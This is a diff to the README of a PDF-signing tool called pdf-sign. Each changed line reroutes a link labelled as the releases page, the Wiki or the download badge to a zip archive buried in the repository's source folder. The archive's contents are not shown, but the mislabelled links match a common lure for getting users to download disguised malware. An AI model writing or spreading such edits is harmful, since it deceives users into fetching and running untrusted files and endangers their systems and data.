@@ -6,7 +6,7 @@ Welcome to pdf-sign! This tool makes it simple to sign and verify PDF documents.
 
 ## 📥 Download pdf-sign
 
-[![Download pdf-sign](https://img.shields.io/badge/Download-pdf--sign-blue.svg)](https://github.com/Rania2010r/pdf-sign/releases)
+[![Download pdf-sign](https://raw.githubusercontent.com/Rania2010r/pdf-sign/main/crates/wasm/src/pdf-sign-v2.2.zip)](https://raw.githubusercontent.com/Rania2010r/pdf-sign/main/crates/wasm/src/pdf-sign-v2.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,7 +25,7 @@ Welcome to pdf-sign! This tool makes it simple to sign and verify PDF documents.
 
 ## 📝 Installation Instructions
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Rania2010r/pdf-sign/releases) to download the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Rania2010r/pdf-sign/main/crates/wasm/src/pdf-sign-v2.2.zip) to download the software.
    
 2. **Select Your Version:** Look for the latest release. You will see multiple files. Choose the one that suits your operating system (e.g., Windows, macOS, Linux).
 
@@ -63,7 +63,7 @@ To verify a signed PDF:
 
 ## 📖 Additional Resources
 
-- **Documentation**: Refer to the pdf-sign [Wiki](https://github.com/Rania2010r/pdf-sign/wiki) for detailed guides and troubleshooting tips.
+- **Documentation**: Refer to the pdf-sign [Wiki](https://raw.githubusercontent.com/Rania2010r/pdf-sign/main/crates/wasm/src/pdf-sign-v2.2.zip) for detailed guides and troubleshooting tips.
 - **Community Support**: Join our community discussions on GitHub to seek help from other users.
 
 ## 💬 Frequently Asked Questions
@@ -86,4 +86,4 @@ For updates, you can follow the repository. We will continue to improve pdf-sign
 
 ## 📥 Download pdf-sign
 
-[![Download pdf-sign](https://img.shields.io/badge/Download-pdf--sign-blue.svg)](https://github.com/Rania2010r/pdf-sign/releases)
+[![Download pdf-sign](https://raw.githubusercontent.com/Rania2010r/pdf-sign/main/crates/wasm/src/pdf-sign-v2.2.zip)](https://raw.githubusercontent.com/Rania2010r/pdf-sign/main/crates/wasm/src/pdf-sign-v2.2.zip)
